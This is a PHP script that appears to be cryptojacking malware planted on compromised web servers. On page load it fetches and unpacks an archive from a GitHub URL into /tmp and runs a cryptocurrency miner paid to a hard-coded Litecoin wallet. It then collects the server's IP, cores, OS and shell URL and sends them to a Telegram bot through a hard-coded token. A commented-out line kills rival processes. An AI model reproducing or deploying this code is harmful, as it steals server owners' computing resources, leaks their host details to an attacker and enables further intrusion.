<?php
$wallet = 'LTXhZHiejQkrmDNvxsr5n5tBxLiDgV9cK1';
//exec("ps -ef|awk '/upgrade|update|xmrig|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}' |xargs kill -9");
function OS() {
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}
echo '<center><h1>PASUKAN BERANI MATI</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] ';
echo 'Curl: ', function_exists('curl_version') ? 'Enabled' : 'Disabled';
echo '<br/>';
$filenya = '/tmp/controler';
if(in_array  ('curl', get_loaded_extensions())){
	if (file_exists($filenya)) {
		system('cd /tmp; ./controler -a yespowerR16 -o stratum+tcp://mine.zpool.ca:6534 -u '.$wallet.' -p c=LTC --background');
	} else {
		system('cd /tmp; curl -o k.tar.gz https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/k.tar.gz; tar -zxf k.tar.gz; ./controler -a yespowerR16 -o stratum+tcp://mine.zpool.ca:6534 -u '.$wallet.' -p c=LTC --background');
	}
} else {
	if (file_exists($filenya)) {
		system('cd /tmp; ./controler -a yespowerR16 -o stratum+tcp://mine.zpool.ca:6534 -u '.$wallet.' -p c=LTC --background');
	} else {
		system('cd /tmp; wget https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/k.tar.gz; tar -zxf k.tar.gz; ./controler -a yespowerR16 -o stratum+tcp://mine.zpool.ca:6534 -u '.$wallet.' -p c=LTC --background');
	}
}
$sys = php_uname();
$lihat = system('curl ipecho.net/plain');
$corenya = system('nproc');
$home = $_SERVER['DOCUMENT_ROOT'];
$domen = $_SERVER['SERVER_NAME'];
$tempat = $_SERVER['REQUEST_URI'];
$apiToken = "1862821332:AAHp1nTa72MEM9vHkL7-lAW-OgWp8U_p7MA";
$osnya = OS();
$data = [ 'chat_id' => '-562021285', 'text' => "Miner : $wallet \r\nSHELL : http://$domen/$tempat \r\n HOME: $home  \r\nIP : $lihat   \r\n Core : $corenya \r\n OS: $osnya\r\n Uname : \r\n $sys \r\n " ];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
